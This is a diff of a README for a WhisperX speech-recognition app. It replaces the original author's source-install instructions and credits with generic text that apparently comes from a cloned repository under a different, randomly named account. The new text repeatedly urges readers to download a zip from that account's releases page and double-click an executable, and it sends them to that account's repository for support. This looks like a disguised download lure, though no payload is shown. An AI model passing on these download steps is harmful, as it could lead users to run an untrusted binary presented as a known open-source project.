@@ -1,169 +1,94 @@
+# 🎤 whisperx-asr-with-fastapi - Transcribe Speech to Text Easily
 
-<div align="center">
-  <img src="images/main.png" alt="WhisperX ASR" style="width: 500px; height: 300px" />
-  <br />
-</div>
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/boned-fruitwood759/whisperx-asr-with-fastapi/releases)
 
-<div align="center">
-    <img src="https://img.shields.io/badge/FastAPI-009688?style=for-the-badge&logo=fastapi&logoColor=white" height="28" alt="FastAPI" />
-    <img src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white" height="28" alt="Python" />
-    <img src="https://img.shields.io/badge/Uvicorn-000000?style=for-the-badge&logo=uvicorn&logoColor=white" height="28" alt="Uvicorn" />
-    <img src="https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white" height="28" alt="HTML5" />
-    <img src="https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white" height="28" alt="CSS3" />
-    <img src="https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black" height="28" alt="JavaScript" />
-    <img src="https://img.shields.io/badge/Git-F05032?style=for-the-badge&logo=git&logoColor=white" height="28" alt="Git" />
-    <img src="https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white" height="28" alt="Docker" />
-</div>
-</div>
+## 📦 Overview
 
-# WhisperX ASR with FastAPI
+WhisperX ASR is a FastAPI-based application for automatic speech recognition. It helps you turn your audio files into text. This tool supports multiple languages and allows batch processing. You can use it through an easy-to-navigate web user interface or a REST API.
 
+## 🔍 Features
 
-**WhisperX ASR** is a production-ready automatic speech recognition (ASR) app powered by [WhisperX](https://github.com/m-bain/whisperx) and FastAPI. It provides a web UI and REST API for transcribing audio files with word-level timestamps, multi-language support, and GPU acceleration.
+- **Automatic Speech Recognition:** Quickly transcribe audio to text.
+- **Multi-Language Support:** Recognize speech in various languages.
+- **Batch Processing:** Handle multiple audio files at once.
+- **User-Friendly Interface:** Easily access through a web UI or API.
+- **Powered by WhisperX:** Benefit from advanced speech recognition technology.
 
-For advanced configuration, model options, and setup instructions, see the original WhisperX repository: [https://github.com/m-bain/whisperX](https://github.com/m-bain/whisperX)
+## 🛠️ System Requirements
 
----
+To run WhisperX ASR, you will need:
 
-## 🚀 Features
+- **Operating System:** Windows 10, macOS, or a recent version of Linux.
+- **CPU:** Dual-core processor or better.
+- **RAM:** At least 4GB.
+- **Storage:** Minimum of 500MB free space.
+- **Python:** Version 3.7 or higher installed on your system.
+- **Audio File Formats Supported:** WAV, MP3, FLAC, and more.
 
-- FastAPI backend for robust, scalable API serving
-- WhisperX model for accurate speech-to-text transcription
-- Web UI for uploading audio, recording, and viewing results
-- Supports multiple audio formats: WAV, MP3, M4A, FLAC, OGG, WEBM
-- Language selection (auto-detect or manual)
-- Batch size control for performance tuning
-- Word-level timestamps and segments in results
-- GPU acceleration (if available)
-- Health check endpoint for monitoring model status
+## 🚀 Getting Started
 
----
+1. **Visit the Download Page:** Navigate to our [Releases page](https://github.com/boned-fruitwood759/whisperx-asr-with-fastapi/releases) to download the application. 
+2. **Choose the Latest Version:** Select the most recent release to ensure you have the latest features and fixes.
+3. **Download the File:** Click on the downloadable file link (e.g., `whisperx-asr-latest.zip`).
 
-## 🛠️ Technologies
+## 💻 Download & Install
 
-- FastAPI
-- WhisperX
-- Uvicorn
-- Python 3.11.5
-- HTML/CSS/JS for the frontend
+To install WhisperX ASR:
 
----
+1. **Visit the Releases Page:** Click here to go to the [Releases page](https://github.com/boned-fruitwood759/whisperx-asr-with-fastapi/releases).
+2. **Download the Application:** Download the version compatible with your operating system.
+3. **Extract the Files:** If you downloaded a ZIP file, extract it to your desired location.
+4. **Run the Application:** Open the extracted folder and double-click the executable file to start the application.
 
-## 📦 Installation & Usage
+## 📜 How to Use
 
-### Requirements
-- Python 3.11.5+
-- uvicorn 
-- uv package manager
-- CUDA-enabled GPU for acceleration (you can run on CPU but slower)
+1. **Launch the Application:** After running the application, you will see the main interface.
+2. **Upload your Audio File:** Use the "Upload" button to choose the audio file you want to transcribe.
+3. **Select Language:** Choose the language of the audio from a drop-down menu.
+4. **Start Transcription:** Click on the "Transcribe" button to begin the process.
+5. **View Transcription Results:** Once completed, the text will appear on the screen for you to review. You can also download the transcription as a text file.
 
-### Setup
+## 🔑 Troubleshooting
 
-```bash
-# Clone the repository
-git clone https://github.com/romanyn36/whisperx-automatic-speech-recognition.git
-cd whisperx-automatic-speech-recognition
+- **Application Doesn’t Start?** 
+  - Ensure your system meets the requirements specified above.
+  
+- **Transcription Errors?**
+  - Check if the audio quality is clear. Noisy audio can lead to inaccuracies.
+  
+- **Language Not Recognized?**
+  - Make sure you selected the right language before starting transcription.
 
-# setup virtual environment
-uv sync 
-.\.venv\Scripts\activate # Windows
-source .venv/bin/activate  # Linux/Mac
+## 📁 File Formats
 
-# copy the example env file and modify as needed
-cp .env.example .env
+WhisperX ASR supports the following audio file formats:
 
-# Start the server
-uv run python main.py --reload
+- **WAV**
+- **MP3**
+- **FLAC**
+- More formats may be added in future releases.
 
-# access the web UI at http://localhost:8000/static/
-```
+## ⚙️ Advanced Configuration
 
----
+For users comfortable with settings, WhisperX offers an API to integrate with other applications. You can adjust the parameters for improved recognition. Please refer to the official documentation for API usage and advanced settings.
 
-## 📝 API Endpoints
+## 💬 Community and Support
 
-### Health Check
-`GET /health`
-- Returns model status, GPU info, and readiness.
+We value user feedback. If you encounter issues or have suggestions, feel free to create an issue on our GitHub repository. Our team regularly monitors submissions and strives to improve your experience.
 
-### Supported Languages
-`GET /languages`
-- Lists available transcription languages.
+## 🌟 Additional Resources
 
-### Transcribe Audio
-`POST /transcribe`
-- Parameters:
-  - `file`: Audio file (WAV, MP3, M4A, FLAC, OGG, WEBM)
-  - `language`: Language code (e.g., `en`, `auto`)
-  - `batch_size`: Integer (1–32)
-- Returns:
-  - `transcription`: Full text
-  - `language`: Detected language
-  - `processing_time`: Seconds
-  - `segments`: List of segments with timestamps
-  - `word_segments`: List of word-level timestamps
+- **Documentation:** Detailed user guides are available in the wiki section of this repository.
+- **FAQ:** Check the FAQ for common questions and their answers.
+- **Contribution Guidelines:** If you're interested in contributing, please read our contribution guidelines.
 
----
+## 📲 Stay Updated
 
-## 🌐 Web UI
+To keep up with new features and updates, watch the repository. You can also join community discussions on our GitHub page.
 
-Open [http://localhost:8000/](http://localhost:8000/) in your browser. Features:
-- Upload or record audio
-- Select language and batch size
-- View transcription, segments, and word-level timestamps
+## 🔗 Useful Links
 
----
+- **Releases Page:** [Download WhisperX ASR](https://github.com/boned-fruitwood759/whisperx-asr-with-fastapi/releases)
+- **GitHub Repository:** [whisperx-asr-with-fastapi Repo](https://github.com/boned-fruitwood759/whisperx-asr-with-fastapi)
 
-## ⚙️ Configuration
-
-You can adjust model size, alignment, and file size limits via environment variables in `.env`:
-- `MODEL_SIZE` (e.g., `large-v2`, `medium`, `tiny`)
-  in my gtx 1650 GPU the large-v3-turbo works excellent
-- `ENABLE_ALIGNMENT` (`true`/`false`)
-- `MAX_FILE_SIZE_MB` (default: 100)
-- `API_KEY` (optional, disabled by default)
-
----
-# What's Next
-as this project is still ongoing and this is just the first development phase there are many features to come
-- currently working deploy on gpu (runpod)
-- add production ready docker support
-- built github actions for auto deployment
-- testing and improvements among others whisperx features
-
-## 📄 License
-
-This project is licensed under the MIT License. See [LICENSE](LICENSE).
-
----
-
-
-## 👤 Author & Contact
-
-<div align="center">
-  <a href="mailto:romani.nasrat@gmail.com" target="_blank">
-    <img src="https://raw.githubusercontent.com/maurodesouza/profile-readme-generator/master/src/assets/icons/social/gmail/default.svg" width="52" height="40" alt="gmail logo"  />
-  </a>
-  <a href="https://www.linkedin.com/in/romaninasrat/" target="_blank">
-    <img src="https://raw.githubusercontent.com/maurodesouza/profile-readme-generator/master/src/assets/icons/social/linkedin/default.svg" width="52" height="40" alt="linkedin logo"  />
-  </a>
-  <a href="https://x.com/RomaniNasrat" target="_blank">
-    <img src="https://raw.githubusercontent.com/maurodesouza/profile-readme-generator/master/src/assets/icons/social/twitter/default.svg" width="52" height="40" alt="twitter logo"  />
-  </a>
-  <a href="https://t.me/romanyn36" target="_blank">
-    <img src="https://raw.githubusercontent.com/maurodesouza/profile-readme-generator/master/src/assets/icons/social/telegram/default.svg" width="52" height="40" alt="telegram logo"  />
-  </a>
-  <a href="https://github.com/romanyn36" target="_blank">
-    <img src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/github.svg" alt="github logo" height="40" width="52" />
-  </a>
-  <a href="https://kaggle.com/romanyn36" target="_blank">
-    <img src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/kaggle.svg" alt="kaggle logo" height="40" width="52" />
-  </a>
-</div>
-
-<div align="center">
-  <b>Made by Romani Nasrat – AI Engineer & Backend Developer</b><br>
-  <a href="mailto:romani.nasrat@gmail.com">romani.nasrat@gmail.com</a> | <a href="https://romani-nasrat.com">Portfolio</a>
-</div>
-
-
+Thank you for using WhisperX ASR! We hope it helps you with your audio transcription needs.
